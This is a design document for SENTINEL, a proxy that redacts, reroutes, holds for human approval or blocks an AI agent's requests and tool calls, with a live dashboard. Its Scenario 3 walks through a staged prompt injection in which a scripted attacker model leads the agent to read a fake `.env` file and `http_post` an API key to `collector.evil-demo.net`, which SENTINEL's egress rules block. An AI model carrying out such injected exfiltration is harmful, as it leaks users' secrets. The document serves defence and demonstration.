# SENTINEL design

Where the Shape section and the Synthesis decision disagree, the Synthesis decision wins. The Phase 0 results and operator amendments are in `DECISIONS.md`.

## Problem

SENTINEL must sit between a stock Anthropic-SDK agent and two Anthropic-shaped upstreams, classify every request, apply a first-match policy, check the tool calls that come back, and show every step live on a dashboard. Four things make the shape non-obvious.

1. A HOLD parks a live HTTP request until a human clicks in another process, or until 60 s pass. The wait has to be race-free against expiry and must resolve only to forwarded or blocked.
2. Redaction has to survive the agent's statelessness. The agent sends back full history with real values each turn, and the upstream must see the same bytes it saw last turn (P4: known vault values win, new values are detected only outside them).
3. The model emits blocks SENTINEL must never touch. Thinking blocks with an empty `signature` round-trip as-is (amendment 1).
4. Amendment 3 breaks the naive reading of REROUTE. In Scenario 3 the request already carries a SECRET when it is headed to the scripted attacker. If REROUTE means "always go to the configured local model", the attacker stub never sees step 3, and the egress block (the point of the demo) never fires.

Constraints from Phase 0 (DECISIONS.md): both upstreams are Anthropic clients (no Ollama translation). Every upstream call carries `x-opencode-session` and `user-agent: sentinel/0.1`. Presidio is 4 to 31 ms per analyze, and it must only be asked for the entity types the policy names. Email needs a custom regex.

## Usage (caller's view)

### The agent: change only `base_url`

```python
client = anthropic.Anthropic(
    base_url="http://127.0.0.1:8787",           # SENTINEL
    api_key="ignored-by-sentinel",              # SENTINEL uses its own key from env
    default_headers={"x-sentinel-session": run_id},  # optional; "default" when absent
    max_retries=0, timeout=90,                  # a HOLD can park the call for 60 s
)
resp = client.messages.create(model="any", max_tokens=1500, tools=TOOLS, messages=history)
# resp is a normal Message. On BLOCK it is one text block "[SENTINEL] Request blocked: ...".
# On an egress block the offending tool_use is gone and a "[SENTINEL] Tool call blocked: ..."
# text block takes its place. stop_reason becomes end_turn if no tool_use is left.
```

`--vulnerable` adds one header, `x-sentinel-upstream: attacker-sim`. Nothing else changes. The request goes through the same pipeline, and the event says `upstream.simulated = true`.

### The test: drive one turn with no server

```python
policy = load_policy(yaml.safe_load(POLICY))
ctx = TurnContext(policy=policy, scanner=Scanner(FakeDetector(), Vault(), policy.tiers),
                  upstreams=REGISTRY, ports=FakePorts(reply=model_reply_with_http_post_of_fake_key))
reply = await run_turn(Inbound(session_id="t", upstream_id="attacker-sim", conversation=conv, params=P), ctx)

assert [b.name for b in reply.blocks if isinstance(b, ToolUse)] == []           # what the agent gets
assert "possible prompt injection" in reply.blocks[-1].text
assert ctx.ports.events[-1].egress[0].action is Action.BLOCK                        # what the dashboard gets
```

`FakePorts.hold` returns `"approved"`, `"denied"`, or `"expired"` so tests cover every HOLD outcome without a clock. Pure pieces are callable alone: `decide(detection, policy, requested, local)`, `vault.mask(...)`, `check_egress(...)`.

### The dashboard: one stream, one record type

```ts
ws.onmessage = ({ data }) => {
  const m = JSON.parse(data) as { kind: "event"; data: Event } | { kind: "approval"; data: Approval };
  if (m.kind === "event") events.upsert(m.data.id, m.data);   // same id arrives once per stage; last write wins
  else approvals.upsert(m.data.id, m.data);
};
// feed row:   e.headline, e.request.reason, e.upstream?.id, e.request.entity_counts
// diff pane:  e.diff[]  -> {where, real, masked, marks}
// graph:      e.hops[]  -> {src, dst, action, state}   (state "blocked" draws the red X)
// toast:      e.headline === "BLOCK" && e.stage === "returned"
// modal:      approvals with status "pending" (countdown from expires_at)
```

On load it calls `GET /api/events?limit=200` and `GET /api/approvals` once, then lives on `/ws`. The dashboard is now the web app's Monitor page, `fragmos/components/monitor/`, at `http://127.0.0.1:3000/monitor`. It reaches these endpoints through the `/engine/*` rewrite in `fragmos/next.config.ts`.

## Shape

### A, the network proxy. B loses.

The agent changes only `base_url`. B (in-process middleware) still needs a server for the dashboard, the WebSocket, and the approval endpoint. A HOLD in B would make the agent process poll that server, so B ends up as A plus a second copy of the state in the agent process (split ownership). A also works with any Anthropic client, so a judge can point `curl` at it.

### Module map

```
sentinel/
  core/                 # pure: no fastapi, anthropic, presidio, sqlite, asyncio.sleep
    model.py            # every domain type: Conversation/Reply + leaf walking, Decision, Stage + TRANSITIONS, Event
    detect.py           # Detector protocol, Scanner (detector spans + vault spans, merged), detect()
    policy.py           # load_policy(dict), the shared When matcher, decide(), check_egress(), apply_egress()
    vault.py            # Vault: append-only value<->placeholder map, mask(), unmask()
    turn.py             # Turn, Ports, run_turn(), event_of(), hops(): the lifecycle spine
  presidio_detector.py  # the one Detector impl: Presidio + HEALTH/SECRET/EMAIL recognizers, the patterns and entropy check ported from Fragmos, lru_cache
  wire.py               # the only module that knows Anthropic JSON: parse_request, to_upstream, reply_from_sdk, reply_to_json
  upstreams.py          # registry from env, one AsyncAnthropic per upstream, call()
  approvals.py          # ApprovalDesk: the HOLD wait, 60 s expiry, first-writer-wins resolve
  store.py              # SQLite: events upsert, approvals rows, stats
  app.py                # FastAPI routes, WS hub, Sessions (vaults), wires Ports; serves no UI
demo/sim_upstream.py    # the scripted attacker: a tiny Anthropic-compatible /v1/messages on :8789
```

To trace a request you read `app.py` (edge), then `core/turn.py` (the spine). Every stage is one call into the module that owns that knowledge: `detect`, `decide`/`check_egress`, `vault`. `tests/test_boundaries.py` imports every `sentinel.core` module and fails if `fastapi`, `anthropic`, `presidio_analyzer`, or `sqlite3` shows up in `sys.modules`, so the core stays pure (per encode-lessons-in-structure).

### Data structures first

- **`Conversation` / `Reply`** are parsed once in `wire.py`. Blocks are a closed union: `Text`, `ToolUse`, `ToolResult`, `Opaque`. Each keeps unknown keys (`cache_control`, `citations`) in `extra` so serialization is lossless. `thinking`, `redacted_thinking`, images, and anything unrecognized are `Opaque(raw)` and re-emitted as the same dict. String content is normalized to one `Text` block, consistently every turn, so byte-identity still holds.
- **`Leaf(path, text, rewritable)`** is the one traversal. `conv.leaves()` yields every string SENTINEL scans: system text, text blocks, tool_result text, every string inside `tool_use.input` reached by walking parsed JSON, and thinking text marked `rewritable=False`. `conv.rewrite(fn)` maps only the rewritable ones. Detection, redaction, rehydration, egress, and the diff all go through these two methods. "Never string-match serialized JSON" is a property of the structure, not a rule to remember.
- **`Finding(entity_type, tier, path, start, end, score, value, source, opaque)`.** `source` is `"vault"` or `"detector"`. `Detection` holds the tuple plus an index by path. The findings are computed once per turn and reused for classification, redaction, and the diff marks. Redaction never calls Presidio a second time.
- **`Decision`** is a closed union of frozen dataclasses, and each variant carries only what it needs:
  `Allow(rule, reason, upstream)` · `Redact(rule, reason, upstream, entity_types)` · `Reroute(rule, reason, upstream, already_local)` · `Hold(rule, reason, upstream)` · `Block(rule, reason)`.
  Every forwarding variant names its upstream, so the turn never asks "where does this go?" again. `Block` has no upstream, so a blocked request cannot be forwarded by mistake.
- **`Vault`** is per session, in memory, and append-only. A value never changes placeholder, and a placeholder never changes value. That one invariant makes staleness harmless across awaits and makes `mask` idempotent.
- **`Event`** is the turn's public record, rebuilt by the pure `event_of(turn)` at every stage and upserted by id. It is the whole dashboard contract (below).

### Policy and egress tables are data with one matcher

`policy.yaml` keeps the brief's `tiers` and `rules` verbatim. The egress section becomes a first-match table using the same `When` matcher, plus a map from each external tool to the argument that names its destination. That map is the single list of external tools, so there is no separate `external_tools` list to sync.

```yaml
egress:
  allowed_domains: [localhost, 127.0.0.1, demo.sentinel.local]
  tools: { send_email: to, http_post: url, web_fetch: url }   # external tools -> destination arg
  rules:                                                       # first match wins
    - name: possible-prompt-injection
      when: { entity_in: [SECRET, US_SSN, CREDIT_CARD], domain_allowed: false }
      action: BLOCK
    - name: personal-data-needs-approval
      when: { entity_in: [PERSON, EMAIL_ADDRESS, PHONE_NUMBER, HEALTH] }
      action: HOLD
    - name: default
      action: ALLOW
```

`When` has three optional keys: `entity_in`, `tier_gte`, `domain_allowed`. All present keys must hold. `load_policy` rejects `domain_allowed` in request rules, actions outside `{ALLOW, HOLD, BLOCK}` in egress, and a table whose last rule is not unconditional. A bad policy fails at boot, not mid-demo (per boundary-discipline). The payload is every input leaf except the destination argument. The destination is judged by `domain_allowed`, and including it would make every `send_email` hold on the `to` address alone. Tools not in `tools` are internal (`read_file`) and get a recorded `ALLOW` with rule `internal-tool`, so the graph still draws them.

Presidio is asked only for the entity types that are keys of `tiers` (derived, not a second list). That is why `URL`, `US_ITIN`, and `US_DRIVER_LICENSE` vanish with no ignore list. At boot, `/health` reports any tier key with no recognizer (`FINANCIAL` today).

### Lifecycle

```
received -> detected -> decided -+-> forwarded -> rehydrated -> egress_checked -+-> returned
                                 |       ^                                     |       ^
                                 +-> held +-> blocked -> returned              +-> tool_held
                                 +-> blocked -> returned          forwarded -> failed (upstream error)
```

`TRANSITIONS: dict[Stage, frozenset[Stage]]` is the single table. `Turn.advance(stage)` raises on any edge not in it. `held` has exactly two exits, `forwarded` and `blocked`. `tool_held` has exactly one exit, `returned`, and the approval's outcome is written onto each held tool call as `forwarded` or `blocked`. Both HOLDs reduce through one function: `resolution(status) -> Literal["forwarded", "blocked"]`, where approved becomes forwarded and denied or expired becomes blocked. That function is the only place that mapping exists.

`run_turn` is one async function that reads top to bottom as the lifecycle. A HOLD is `await ctx.ports.hold(subject)`. The core has no resume entry, no continuation object, and no clock. The 60 s lives in the shell's `ApprovalDesk`:

- `hold()` inserts an `approvals` row `(status='pending', expires_at=now+60)`, broadcasts it, and awaits a future with `asyncio.wait_for(shield(fut), 60)`.
- Both `resolve(id, approve)` (from `POST /api/approvals/{id}`) and the timeout path run `UPDATE approvals SET status=? WHERE id=? AND status='pending'`. Only the writer that gets `rowcount == 1` sets the future. The loser reads the stored status. Approval racing expiry has exactly one winner, and SQLite decides it.
- POST is idempotent: the same verdict twice returns 200 with the stored row, and a contradicting verdict returns 409 with the stored row.
- At boot, `expire_orphans()` marks every leftover `pending` row as `expired`, because no future survives a restart.

One approval per turn covers all held tool calls in that reply (approve all or deny all). The demo has at most one per turn, and the modal stays one card.

### REROUTE when the target is already local-class

REROUTE is a destination constraint ("this data may not leave the trust boundary"), not "use the model named local". Each upstream has `trust: cloud | local`. `decide` resolves it this way:

- requested upstream is `cloud`: `Reroute(upstream="local", already_local=False)`
- requested upstream is already `local`: `Reroute(upstream=requested, already_local=True)`, forwarded unchanged and unredacted

The scripted attacker is registered as `attacker-sim (trust=local, simulated=true)`. The honest story then holds: an on-device model can be injected too. REROUTE kept the secret off the cloud, and the egress check caught the tool call that tried to send it out. Scenario 3, step by step:

1. User prompt → `ALLOW` → attacker-sim → `web_fetch(localhost:8788)`. Egress is `ALLOW` (localhost is allowed, payload is clean).
2. History has the blog's author name → `REDACT` → `read_file(.env.fake)`. Internal tool.
3. History has `sk-ant-…` → `REROUTE (already_local)` → `http_post(collector.evil-demo.net, <key>)`. Egress is `BLOCK possible-prompt-injection`. The event carries `upstream.simulated=true`, the red toast fires, and the graph ends the `tool:http_post → domain:collector.evil-demo.net` hop in an ✕.

Every upstream is chosen by the `x-sentinel-upstream` header (default `cloud`), validated against the registry at the edge. An agent can only pick a registered upstream, and policy applies to all of them.

### Redaction and rehydration (P4, one scan)

`detect` merges two span sources per leaf: `vault.known_spans(text)` (every occurrence of every known value, longest first) and the detector's spans. Overlaps go to vault spans first, then to longer spans. Spans that overlap an existing `[TYPE_N]` token are dropped. `Redact` then masks, in each rewritable leaf, every vault-sourced span plus every detector span whose type is in `decision.entity_types` (the types that made the rule match, derived from the rule). The result matches P4's rule: known values win, and new values come only from outside them. It takes one Presidio pass instead of two, and the diff marks fall out of the same spans. REDACT also appends one fixed system text block (`REDACTION_NOTE`, amendment 5), which keeps the system prompt identical every turn.

`unmask` runs on every reply: `\[[A-Z_]+_\d+\]` tokens known to the vault are replaced in text leaves and in `tool_use.input` string leaves. It is a no-op when nothing matches, so the stage is unconditional.

### Thinking blocks

`Opaque`: never rewritten in either direction, re-emitted as the same dict. They are scanned read-only, because a rerouted turn's thinking can contain real values. Their findings count toward the tier. If a REDACT would send an opaque block holding a finding of a redacted type, `decide` escalates to `Reroute` with reason "sensitive data inside a thinking block, which SENTINEL never modifies". Nothing SENTINEL can't redact ever reaches a cloud model. Cloud thinking only ever contains placeholders, which the scanner ignores, so this almost never fires in the scenarios.

### The Event contract

```
Event {
  id, session_id, created_at, updated_at, stage,
  headline: Action,                         # most severe of request action and egress outcomes; feed chip, toast
  request: { action, rule, reason, tier, entity_counts: {type: n} },
  upstream: { id, trust, model, simulated, already_local } | null,   # null when blocked before forwarding
  egress: [ { tool_use_id, tool, destination, entities, action, rule, reason, outcome: forwarded|blocked|pending } ],
  approval: { id, status, expires_at } | null,
  diff: [ { where, direction: request|tool_call, real, masked, marks: [{start, end, entity_type, placeholder}] } ],
  hops: [ { src, dst, action, state: active|done|pending|blocked } ],
  stop_reason, latency_ms: { detect, upstream, total }, error
}
```

- **Diff.** `real` is the text with real values and `masked` is what the model saw. That covers both directions: the request leaves new since the last assistant message (user text, tool results), and every tool call (model's placeholder input against the agent's rehydrated input). Under REROUTE or ALLOW, `masked == real`, and the marks show what went raw and where. Each leaf is capped at 2 KB.
- **Hops** are a pure function of the turn. Node ids describe themselves (`agent`, `sentinel`, `model:<upstream id>`, `tool:<name>`, `domain:<host>`), so the graph needs no node query. The dashboard colors by `action` (green allow, blue redact, purple reroute, amber hold, red block) and draws ✕ on `state="blocked"`. In a REROUTE turn no hop touches `model:cloud`, so that edge stays dark.

### SQLite (one writer per table)

```sql
CREATE TABLE events (
  seq        INTEGER PRIMARY KEY AUTOINCREMENT,   -- feed order
  id         TEXT NOT NULL UNIQUE,                -- turn id
  session_id TEXT NOT NULL,
  created_at REAL NOT NULL,
  updated_at REAL NOT NULL,
  stage      TEXT NOT NULL,
  headline   TEXT NOT NULL,
  upstream   TEXT,                                -- upstream id or NULL
  body       TEXT NOT NULL                        -- Event JSON; the columns above are projections written by the same upsert
);
CREATE INDEX events_session ON events(session_id, seq);

CREATE TABLE approvals (
  id          TEXT PRIMARY KEY,
  event_id    TEXT NOT NULL REFERENCES events(id),
  status      TEXT NOT NULL CHECK (status IN ('pending','approved','denied','expired')),
  created_at  REAL NOT NULL,
  expires_at  REAL NOT NULL,
  resolved_at REAL,
  subject     TEXT NOT NULL                       -- JSON: request summary or held tool calls, rehydrated
);
```

`store.upsert_event(event)` is the only writer of `events`: the turn emits, and the store writes. `ApprovalDesk` is the only writer of `approvals`. `/api/stats` aggregates `events.body` on read (counts by headline, entity type, destination). No counters exist, so nothing needs syncing. WAL mode, and one connection on the event loop (sub-millisecond writes).

### Interface depth

The core's public surface is `run_turn(inbound, ctx) -> Reply` plus the types. Behind it sit detection merge, tiering, first-match policy, REROUTE resolution, the opaque-block escalation, vault masking, rehydration, egress tables, the transition table, and event and hop derivation. Ports are three methods (`call_upstream`, `hold`, `emit`). The sketch lives in `sketch/` with the package layout above, plus `policy.yaml`, `schema.sql`, and `demo/sim_upstream.py`. The shell's public surface is the HTTP API in the brief plus `x-sentinel-upstream` and `GET /api/events?session=`.

## Synthesis decision

Base: candidate 1 (Opus). Runners: candidate 1 `claudeAgent/claude-opus-5-5`, candidate 2 `codex/gpt-6.1-sol`, candidate 3 `cursor/grok-4.7`. Cross-judge `codex/gpt-6.1-sol` recommended candidate 2, which it also wrote. All three converged on the network proxy, a pure core, one row per turn, REROUTE keeping an already-local upstream, and approved egress HOLD returning the held reply without calling the model again.

Candidate 1 wins on demo fitness (the Event alone renders feed, diff, modal, toast, and graph) and interface depth (`run_turn` plus three ports). Candidate 2 lost on two structural points: it validates agent tool schemas against a registered set, which breaks "any Anthropic-SDK agent works unchanged", and its durable revision stream (`event_updates`, OpenAPI codegen, sessions table) is a day of work the demo does not need.

Grafts and overrides, each folded into the base:

1. Vault order is P4 strategy B literally (judge finding against candidate 1): in each rewritable leaf substitute known vault values longest first, then run the detector on the residue only, and drop spans that overlap a `[TYPE_N]` token. Placeholder regex is `\[[A-Z][A-Z_]*_\d+\]`, so `[US_SSN_1]` matches.
2. Approval writes carry the deadline (candidate 2): approve and deny are `UPDATE ... WHERE id=? AND status='pending' AND expires_at > :now`; expiry is the complementary predicate. The loser of a race reads the stored row.
3. `policy.yaml` stays exactly as the brief gives it (candidate 3). `load_policy` compiles the egress section into candidate 1's first-match egress rules: block-listed entity and domain not allowed -> BLOCK `possible prompt injection`; hold-listed entity on any domain -> HOLD; else ALLOW. The destination-argument map (`send_email: to`, `http_post: url`, `web_fetch: url`) is a constant in the loader, derived for each name in `external_tools`, and boot fails if an external tool has no entry.
4. Two hold kinds by name (candidate 3): `ForwardHold` (request side, approved -> forwarded) and `ReleaseHold` (egress side, approved -> the held reply is returned). Both are denied or expired -> blocked.
5. Hosts match exactly (candidate 2): lowercase, IDNA, trailing dot stripped, port ignored; a missing or unparseable destination is not allow-listed; `demo.sentinel.local.evil` never matches.
6. An egress BLOCK replaces the whole tool batch (candidates 2 and 3): every `tool_use` is dropped, text and opaque blocks are kept, one `[SENTINEL] Tool call blocked: <reason>` text block is appended, and `stop_reason` becomes `end_turn`. A request BLOCK returns one text block `[SENTINEL] Request blocked: <reason>`.
7. The thinking fallback in candidate 1's open questions is dropped. A probe showed glm-5.3-flash accepts deepseek thinking blocks with an empty signature in history (DECISIONS.md P5), so thinking passes through unchanged everywhere.
8. Placeholder note goes in whenever the vault is non-empty and the decision is REDACT, as the last system text block, so the upstream system prompt is stable across turns (candidate 3).

## Tradeoffs accepted

- We accept that Event bodies in SQLite hold real values (the `real` side of the diff) in exchange for a dashboard that renders the diff from the event alone. The demo data is fake, and a real deployment would hash or drop `real`.
- We accept Presidio blocking the event loop (up to ~30 ms per uncached leaf, `lru_cache` on text) in exchange for vault mutation that is atomic without locks: no `await` sits between scan, decide, and mask.
- We accept losing the vault on restart (new placeholders, so byte-identity breaks once) in exchange for never persisting a value↔placeholder map.
- We accept the agent's HTTP call staying open for up to 60 s during a HOLD in exchange for a core with no resume entry and a stock SDK agent that needs no polling.
- We accept that one approval covers all held tool calls in a turn, in exchange for one modal card and one HOLD outcome per turn.
- We accept one changed `policy.yaml` section (egress as a rule table plus a `tools` map) in exchange for one matcher and one list of external tools.
- We accept that a question-only first turn goes to the cloud as ALLOW (Scenarios 1 and 2) in exchange for not special-casing "the next turn will probably carry data".

## Alternatives considered

- **B, in-process middleware wrapping the SDK client.** It hides less: every agent must import SENTINEL, and HOLD, the dashboard, and approvals still need a server, so the state lives in two processes. It loses on interface depth (A's whole surface is a URL) and on split ownership.
- **Pure reducer `step(state, input) -> (state, effects)` with an effect interpreter and a `resume_hold` entry.** The lifecycle becomes data, and a test can freeze mid-HOLD. But it adds an effect type per port, an interpreter loop, and a resumable continuation keyed by approval id, roughly doubling the core for a guarantee an awaited port gives already. With a fake port, tests get the same coverage of every HOLD outcome.
- **REROUTE always goes to the configured `local` upstream, with the stub as `cloud` trust.** Step 3 would go to glm, which never posts, so Scenario 3 dies. The fix would be a "simulated bypasses policy" flag, which puts a demo hack inside the policy evaluator.
- **Append-only stage events, folded by the dashboard.** It needs a client-side reducer and a second notion of "the turn". One upserted row per turn matches milestone 1 ("one row per turn"), and upsert by id is idempotent on reconnect.

## Open questions and risks

- Is classing the scripted attacker as `trust=local` the story you want judges to hear ("REROUTE protected inference, egress protected tools")? The alternative is a third trust class, `simulated`, that REROUTE also treats as satisfied.
- Does single-scan merge match P4's two-pass result on the P4 three-turn script? The design claims it's equivalent: vault spans win overlaps. `test_redact.py` should replay `prototypes/p4_roundtrip.py`'s turns and assert byte-identical upstream history before anything else is built on it.
- Do GLM and DeepSeek accept each other's thinking blocks (empty `signature`) in history? A Scenario 1 session sends cloud thinking to glm on turn 2. One curl probe settles it. If they don't, `wire.to_upstream` drops opaque thinking from *prior* turns only, which is still "untouched" in what the agent sees.
- Is it acceptable that Scenario 2's question-only first turn lights the cloud edge green before the data turn goes purple, or should the brief's "cloud edge stays dark" be read per data-bearing turn?
- `glm-5.3-flash` must reliably put a health term in the Scenario 1 summary, because HEALTH is what makes the `send_email` hold deterministic (the `to` address is excluded from the payload). Should `demo_check.py` rerun Scenario 1 three times to prove it?

## Next implementation step

Write `core/model.py`'s `Conversation`/`Leaf` walk and `wire.py`'s parse and serialize with a round-trip test on a captured DeepSeek reply that includes a thinking block. Then wire `run_turn`'s ALLOW path through `app.py` and `store.py` for milestone 1.
